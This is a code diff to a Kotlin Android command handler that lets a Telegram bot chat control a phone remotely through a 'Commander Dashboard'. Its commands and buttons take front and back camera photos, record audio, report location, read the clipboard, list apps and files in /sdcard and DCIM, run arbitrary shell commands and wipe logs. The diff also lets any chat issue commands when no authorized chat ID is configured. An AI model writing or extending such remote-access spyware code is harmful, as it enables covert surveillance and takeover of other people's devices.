@@ -34,30 +34,37 @@ class CommandProcessor @Inject constructor(
     }
 
     suspend fun processUpdate(update: Update, callback: CommandCallback) {
-        val (token, authorizedChatId) = repository.getConfig()
+        val (token, authIdRaw) = repository.getConfig()
+        val authorizedChatId = authIdRaw.trim()
         
         // Handle Callback Queries (Button Clicks)
         update.callback_query?.let { query ->
-            val chatId = query.message?.chat?.id?.toString() ?: ""
-            Log.d("CommandProcessor", "Callback from chat: $chatId, auth: $authorizedChatId")
-            if (chatId != authorizedChatId) return@let
-            
-            // For callbacks on forum topics, message_thread_id is inside the message
+            val chatId = (query.message?.chat?.id?.toString() ?: "").trim()
             val threadId = query.message?.message_thread_id
-            handleCommand(query.data ?: "", callback, threadId, isCallback = true)
+            Log.d("CommandProcessor", "Callback from chat: '$chatId', thread: $threadId, auth: '$authorizedChatId'. Data: ${query.data}")
             
-            // Acknowledge callback (optional but good practice)
-            // repository.answerCallbackQuery(query.id) 
+            if (chatId != authorizedChatId && authorizedChatId.isNotEmpty()) {
+                 Log.w("CommandProcessor", "Unauthorized callback attempt from $chatId (Expected $authorizedChatId)")
+                 return@let
+            }
+            
+            handleCommand(query.data ?: "", callback, threadId, isCallback = true)
+            repository.answerCallbackQuery(query.id) 
         }
 
         // Handle Slash Commands
         update.message?.let { msg ->
-            val chatId = msg.chat.id.toString()
-            Log.d("CommandProcessor", "Message from chat: $chatId, auth: $authorizedChatId")
-            if (chatId != authorizedChatId) return@let
+            val chatId = msg.chat.id.toString().trim()
+            val threadId = msg.message_thread_id
+            Log.d("CommandProcessor", "Message from chat: '$chatId', thread: $threadId, auth: '$authorizedChatId'")
+            
+            if (chatId != authorizedChatId && authorizedChatId.isNotEmpty()) {
+                Log.w("CommandProcessor", "Unauthorized message from $chatId")
+                return@let
+            }
             
             val text = msg.text ?: return@let
-            handleCommand(text, callback, msg.message_thread_id, isCallback = false)
+            handleCommand(text, callback, threadId, isCallback = false)
         }
     }
 
@@ -68,7 +75,8 @@ class CommandProcessor @Inject constructor(
         val args = parts.drop(1)
 
         when (cmd) {
-            "/start", "/help", "menu", "refresh" -> showDashboard(callback, threadId)
+            "/start", "/help", "/menu", "menu", "\\menu" -> showDashboard(callback, threadId, forceNew = true)
+            "refresh" -> showDashboard(callback, threadId, forceNew = false)
             "/status", "status" -> updateStatus(callback, threadId)
             "/location", "location" -> sendResponse(callback.getLocation(), threadId)
             "/flashlight_on", "flashlight_on" -> {
@@ -83,13 +91,6 @@ class CommandProcessor @Inject constructor(
                 callback.vibrate(1000)
                 sendResponse("📳 Vibrating...", threadId)
             }
-            "/say" -> {
-                val sayText = args.joinToString(" ")
-                if (sayText.isNotEmpty()) {
-                    callback.speakText(sayText)
-                    sendResponse("🗣 Speaking: \"$sayText\"", threadId)
-                }
-            }
             "/record_audio", "record" -> {
                 callback.onRecordAudio(10)
                 sendResponse("🎙 Recording 10s...", threadId)
@@ -101,26 +102,28 @@ class CommandProcessor @Inject constructor(
             "apps" -> sendResponse("📦 *Apps:*\n`${callback.listApps()}`", threadId)
             "network" -> sendResponse(callback.getNetworkInfo(), threadId)
             "memory" -> sendResponse(callback.getMemoryInfo(), threadId)
-            "/wipe" -> {
+            "/wipe", "wipe" -> {
                 callback.wipeLogs()
                 sendResponse("🧹 Logs Wiped.", threadId)
             }
-            "/photo", "photo" -> {
-                callback.takePhoto()
-                sendResponse("📸 Capturing photo...", threadId)
+            "/photo", "photo", "photo_back" -> {
+                callback.takePhoto("0")
+                sendResponse("📸 *Capturing Back Photo...*", threadId)
             }
-            "/get" -> {
-                if (args.isNotEmpty()) {
-                    callback.sendFile(args.joinToString(" "))
-                    sendResponse("📤 Uploading file...", threadId)
-                if (args.isNotEmpty()) {
-                    callback.sendFile(args.joinToString(" "))
-                    sendResponse("📤 Uploading file...", threadId)
-                } else {
-                    sendResponse("❌ Usage: /get <path>", threadId)
-                }
+            "photo_front" -> {
+                callback.takePhoto("1")
+                sendResponse("📸 *Capturing Front Photo...*", threadId)
             }
-            "/shell" -> {
+            "/clipboard" -> sendResponse("📋 *Clipboard:*\n`${callback.getClipboard()}`", threadId)
+            "vol_max" -> {
+                callback.setVolume(100)
+                sendResponse("🔊 *Volume set to 100%*", threadId)
+            }
+            "vol_mute" -> {
+                callback.setVolume(0)
+                sendResponse("🔇 *Volume Muted*", threadId)
+            }
+            "/shell", "shell" -> {
                 if (args.isNotEmpty()) {
                     val result = callback.shell(args.joinToString(" "))
                     sendResponse("💻 *Shell Output:*\n```$result```", threadId)
@@ -128,76 +131,96 @@ class CommandProcessor @Inject constructor(
                     sendResponse("❌ Usage: /shell <cmd>", threadId)
                 }
             }
-            "/clipboard" -> sendResponse("📋 *Clipboard:*\n`${callback.getClipboard()}`", threadId)
-            "/close", "/delete_thread" -> {
-                if (threadId != null && threadId != 0) {
-                    sendResponse("🗑 Deleting thread...", threadId)
-                    repository.deleteTopic(threadId)
+            "/launch", "launch", "open" -> {
+                if (args.isNotEmpty()) {
+                    val appName = args.joinToString(" ")
+                    sendResponse("🚀 Attempting to launch: $appName...", threadId)
+                    val result = callback.launchApp(appName)
+                    sendResponse(result, threadId)
                 } else {
-                    sendResponse("❌ Cannot delete main thread.", threadId)
+                    sendResponse("❌ Usage: /launch <App Name>", threadId)
                 }
             }
+            "/ls", "ls", "dir", "files" -> {
+                val path = if (args.isNotEmpty()) args.joinToString(" ") else "/"
+                sendResponse("📂 *Files in $path:*\n`${callback.listFiles(path)}`", threadId)
+            }
+            "/alert", "alert" -> {
+                val alertText = args.joinToString(" ")
+                if (alertText.isNotEmpty()) {
+                    callback.showAlert(alertText)
+                    sendResponse("🚨 Alert shown on device.", threadId)
+                } else {
+                    sendResponse("❌ Usage: /alert <text>", threadId)
+                }
+            }
+            "/say", "say", "tts" -> {
+                val text = args.joinToString(" ")
+                if (text.isNotEmpty()) {
+                    callback.speakText(text)
+                    sendResponse("🗣 Speaking...", threadId)
+                } else {
+                    sendResponse("❌ Usage: /say <text>", threadId)
+                }
+            }
+            "next_page" -> showDashboard(callback, threadId, page = 2)
+            "prev_page" -> showDashboard(callback, threadId, page = 1)
             else -> {
                 if (!isCallback) sendResponse("❓ Unknown command: `$cmd`", threadId)
             }
         }
     }
 
-    private suspend fun showDashboard(callback: CommandCallback, threadId: Int?) {
-        val text = getDashboardText(callback)
-        val markup = getDashboardMarkup()
+    private suspend fun showDashboard(callback: CommandCallback, threadId: Int?, forceNew: Boolean = false, page: Int = 1) {
+        val text = getDashboardText(callback, page)
+        val markup = getDashboardMarkup(page)
         
         val dashboardId = repository.getLastDashboardId()
-        val storedThreadId = repository.getLastDashboardThreadId()
         
-        // Only edit if we are in the same thread
+        // Only try to edit if NOT forcing new and we have an ID
         var success = false
-        if (dashboardId != 0L && storedThreadId == (threadId ?: 0)) {
+        if (!forceNew && dashboardId != 0L) {
             success = repository.editMessage(dashboardId, text, markup)
         }
         
         if (!success) {
-            val msg = repository.sendMessage(text, threadId, markup)
+            val msg = repository.sendMessage(text, null, markup)
             msg?.let { 
                 repository.setLastDashboardId(it.message_id) 
-                repository.setLastDashboardThreadId(threadId ?: 0)
             }
         }
     }
 
     private suspend fun updateStatus(callback: CommandCallback, threadId: Int?, extra: String? = null) {
         val dashboardId = repository.getLastDashboardId()
-        val storedThreadId = repository.getLastDashboardThreadId()
         
-        // If no dashboard or wrong thread, show new dashboard
-        if (dashboardId == 0L || storedThreadId != (threadId ?: 0)) {
+        // If no dashboard, show new dashboard
+        if (dashboardId == 0L) {
             showDashboard(callback, threadId)
             return
         }
 
-        val text = getDashboardText(callback) + (extra?.let { "\n\n$it" } ?: "")
-        val markup = getDashboardMarkup()
+        val text = getDashboardText(callback, 1) + (extra?.let { "\n\n$it" } ?: "")
+        val markup = getDashboardMarkup(1) // Always update page 1 for status updates
         
         val success = repository.editMessage(dashboardId, text, markup)
         if (!success) {
             // If edit failed, resend
-            val msg = repository.sendMessage(text, threadId, markup)
+            val msg = repository.sendMessage(text, null, markup)
             msg?.let { 
                 repository.setLastDashboardId(it.message_id)
-                repository.setLastDashboardThreadId(threadId ?: 0)
             }
         }
     }
 
     private suspend fun sendResponse(text: String, threadId: Int?) {
-        // For quick responses, we just send a message, or we could update dashboard
-        // Let's send a new message for discrete data like GPS coords to keep them visible
-        repository.sendMessage(text, threadId)
+        // For quick responses, we just send a message to the General topic
+        repository.sendMessage(text, null)
     }
 
-    private fun getDashboardText(callback: CommandCallback): String {
+    private fun getDashboardText(callback: CommandCallback, page: Int): String {
         return """
-            📡 *COMMANDER DASHBOARD*
+            📡 *COMMANDER DASHBOARD* (Page $page/2)
             ────────────────────
             ${callback.getStatus()}
             ────────────────────
@@ -205,34 +228,69 @@ class CommandProcessor @Inject constructor(
         """.trimIndent()
     }
 
-    private fun getDashboardMarkup(): InlineKeyboardMarkup {
-        return InlineKeyboardMarkup(
-            inline_keyboard = listOf(
-                listOf(
-                    InlineKeyboardButton("🔄 Refresh", callback_data = "refresh"),
-                    InlineKeyboardButton("📍 Locate", callback_data = "location")
-                ),
-                listOf(
-                    InlineKeyboardButton("🔦 Torch ON", callback_data = "flashlight_on"),
-                    InlineKeyboardButton("🔦 Torch OFF", callback_data = "flashlight_off")
-                ),
-                listOf(
-                    InlineKeyboardButton("🎙 Record", callback_data = "record"),
-                    InlineKeyboardButton("🛑 Stop", callback_data = "stop")
-                ),
-                listOf(
-                    InlineKeyboardButton("📦 Apps", callback_data = "apps"),
-                    InlineKeyboardButton("📶 Net", callback_data = "network"),
-                    InlineKeyboardButton("💾 Mem", callback_data = "memory")
-                ),
-                listOf(
-                    InlineKeyboardButton("📳 Vibrate", callback_data = "vibrate"),
-                    InlineKeyboardButton("🧹 Wipe", callback_data = "wipe")
-                ),
-                listOf(
-                    InlineKeyboardButton("📸 Photo", callback_data = "photo")
+    private fun getDashboardMarkup(page: Int): InlineKeyboardMarkup {
+        return if (page == 1) {
+            InlineKeyboardMarkup(
+                inline_keyboard = listOf(
+                    // Row 1: Status & Core
+                    listOf(
+                        InlineKeyboardButton("🔄 Refresh", callback_data = "refresh"),
+                        InlineKeyboardButton("📍 Location", callback_data = "location"),
+                        InlineKeyboardButton("📋 Clipboard", callback_data = "/clipboard")
+                    ),
+                    // Row 2: Camera & Flash
+                    listOf(
+                        InlineKeyboardButton("💡 ON", callback_data = "flashlight_on"),
+                        InlineKeyboardButton("💡 OFF", callback_data = "flashlight_off"),
+                        InlineKeyboardButton("📸 Back", callback_data = "photo_back"),
+                        InlineKeyboardButton("📸 Front", callback_data = "photo_front")
+                    ),
+                    // Row 3: Audio & Interaction
+                    listOf(
+                        InlineKeyboardButton("🎙 Record", callback_data = "record"),
+                        InlineKeyboardButton("🔊 Max", callback_data = "vol_max"),
+                        InlineKeyboardButton("🔇 Mute", callback_data = "vol_mute"),
+                        InlineKeyboardButton("📳 Buzz", callback_data = "vibrate")
+                    ),
+                    // Row 4: System Info
+                    listOf(
+                        InlineKeyboardButton("📦 Apps", callback_data = "apps"),
+                        InlineKeyboardButton("📡 Net", callback_data = "network"),
+                        InlineKeyboardButton("💾 Mem", callback_data = "memory")
+                    ),
+                    // Row 5: Navigation
+                    listOf(
+                        InlineKeyboardButton("🧹 Wipe Logs", callback_data = "wipe"),
+                        InlineKeyboardButton("🛑 Stop All", callback_data = "stop"),
+                        InlineKeyboardButton("➡️ More", callback_data = "next_page")
+                    )
                 )
             )
-        )
+        } else {
+             InlineKeyboardMarkup(
+                inline_keyboard = listOf(
+                    // Row 1: File System & Launch
+                    listOf(
+                       InlineKeyboardButton("📂 List /sdcard", callback_data = "ls /sdcard"),
+                       InlineKeyboardButton("📂 List DCIM", callback_data = "ls /sdcard/DCIM")
+                    ),
+                    // Row 2: TTS & Alerts
+                    listOf(
+                        InlineKeyboardButton("🗣 Hello", callback_data = "say Hello Commander"),
+                        InlineKeyboardButton("🚨 Test Alert", callback_data = "alert Remote Test")
+                    ),
+                     // Row 3: Shortcuts
+                    listOf(
+                        InlineKeyboardButton("🚀 Maps", callback_data = "launch Maps"),
+                        InlineKeyboardButton("🚀 Camera", callback_data = "launch Camera")
+                    ),
+                    // Row 4: Navigation
+                    listOf(
+                        InlineKeyboardButton("⬅️ Back", callback_data = "prev_page"),
+                        InlineKeyboardButton("🛑 Stop All", callback_data = "stop")
+                    )
+                )
+             )
+        }
     }
 }
